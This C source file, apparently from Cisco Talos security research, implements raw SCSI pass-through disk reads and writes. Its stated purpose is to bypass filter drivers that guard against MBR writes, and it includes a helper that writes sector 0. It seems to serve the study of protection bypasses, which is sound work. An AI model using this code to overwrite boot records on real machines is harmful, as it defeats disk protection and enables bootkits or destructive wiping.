/*++
AccessMBR

This module sends a SCSI Passthrough command to send a read or write command directly to the disk.
Bypassing an MJ_READ/WRITE filter.

Written by Andrea Allievi, Cisco Talos
Copyright (C) 2016 Cisco Systems Inc
--*/

#include "stdafx.h"
#include "SCSI_IO.h"

// The physical sector size in bytes
#define PHYSICAL_SECTOR_SIZE 512

// SCSI Read/Write Sector
BOOL SCSISectorIO(HANDLE hDrive, ULONGLONG offset, LPBYTE buffer, UINT buffSize, BOOLEAN write) {
	SCSI_PASS_THROUGH_DIRECT srb = { 0 };	// SCSI Request Block Structure
	DWORD bytesReturned = 0;				// Number of bytes returned by IOCTL_SCSI_PASS_THROUGH_DIRECT
	IO_SCSI_CAPABILITIES scap = { 0 };		// Used to determine the maximum SCSI transfer length
	DWORD maxTransfLen = 8192;				// Maximum Transfer Length
	DWORD curSize = buffSize;				// Current Transfer Size
	LPBYTE tempBuff = NULL;					// Temporary aligned buffer
	static bool OneShotLog = false;			// Set if I can't use IOCTL_SCSI_PASS_THROUGH_DIRECT

	BOOL retVal = 0;
	DWORD lastErr = 0;
	if (!buffer || !buffSize) return FALSE;

	// Obtain maximum transfer length
	retVal = DeviceIoControl(hDrive, IOCTL_SCSI_GET_CAPABILITIES, NULL, 0, &scap, sizeof(scap), &bytesReturned, NULL);
	lastErr = GetLastError();
	if (retVal)
		maxTransfLen = scap.MaximumTransferLength;

	// Inizialize common SCSI_PASS_THROUGH_DIRECT members 
	RtlZeroMemory(&srb, sizeof(SCSI_PASS_THROUGH_DIRECT));
	srb.Length = sizeof(SCSI_PASS_THROUGH_DIRECT);
	srb.CdbLength = 0xa;
	srb.SenseInfoLength = 0;
	srb.SenseInfoOffset = sizeof(SCSI_PASS_THROUGH_DIRECT);
	if (write)
		srb.DataIn = SCSI_IOCTL_DATA_OUT;
	else
		srb.DataIn = SCSI_IOCTL_DATA_IN;
	srb.TimeOutValue = 0x100;

	while (curSize) {
		if (curSize > maxTransfLen)
			srb.DataTransferLength = maxTransfLen;
		else {
			// Check buffer alignment
			if ((curSize % PHYSICAL_SECTOR_SIZE) != 0)
				// This operation below is so hazardous BUT with VirtualAlloc I'm sure that every memory 
				// allocation is PAGE_ALIGNED
				curSize = curSize + (PHYSICAL_SECTOR_SIZE - (curSize % PHYSICAL_SECTOR_SIZE));
			srb.DataTransferLength = curSize;
		}

		srb.DataBuffer = buffer;
		retVal = SCSIBuild10CDB(&srb, offset, srb.DataTransferLength, write);
		retVal = DeviceIoControl(hDrive, IOCTL_SCSI_PASS_THROUGH_DIRECT, (LPVOID)&srb, sizeof(SCSI_PASS_THROUGH_DIRECT),
			NULL, 0, &bytesReturned, NULL);
		lastErr = GetLastError();			// 87 = Error Invalid Parameter
											// 1117 = ERROR_IO_DEVICE
		if (!retVal) break;
		else lastErr = 0;
		buffer += srb.DataTransferLength;
		curSize -= srb.DataTransferLength;
		offset += srb.DataTransferLength;
	}

	if (lastErr != ERROR_SUCCESS) {
		// Errore 1: ERROR_INVALID_FUNCTION
		return FALSE;
	}
	else
		return TRUE;
}

// Build the 10-bytes SCSI command descriptor block
BOOL SCSIBuild10CDB(PSCSI_PASS_THROUGH_DIRECT srb, ULONGLONG offset, ULONG length, BOOLEAN Write) {
	if (!srb || offset >= 0x20000000000 || length < 1)	
		return FALSE;				
	LPBYTE cdb = srb->Cdb;
	if (Write == FALSE) {
		cdb[0] = SCSIOP_READ;				// READ (10) opcode
		cdb[1] = 0;
	}
	else {
		cdb[0] = SCSIOP_WRITE;				// WRITE (10) opcode
		cdb[1] = 0;
	}
	DWORD LBA = (DWORD)(offset / PHYSICAL_SECTOR_SIZE);
	cdb[2] = ((LPBYTE)&LBA)[3];		
	cdb[3] = ((LPBYTE)&LBA)[2];
	cdb[4] = ((LPBYTE)&LBA)[1];
	cdb[5] = ((LPBYTE)&LBA)[0];		
	cdb[6] = 0x00;

	WORD CDBTLen = (WORD)(length / PHYSICAL_SECTOR_SIZE);		
	cdb[7] = ((LPBYTE)&CDBTLen)[1];	
	cdb[8] = ((LPBYTE)&CDBTLen)[0];
	cdb[9] = 0x00;

	return TRUE;
}

// Helper function that writes the MBR using SCSI I/O
BOOL AaLl86WriteMbr(HANDLE hDrive, BYTE buff[PHYSICAL_SECTOR_SIZE]) {
	return SCSISectorIO(hDrive, 0, buff, PHYSICAL_SECTOR_SIZE, TRUE);
}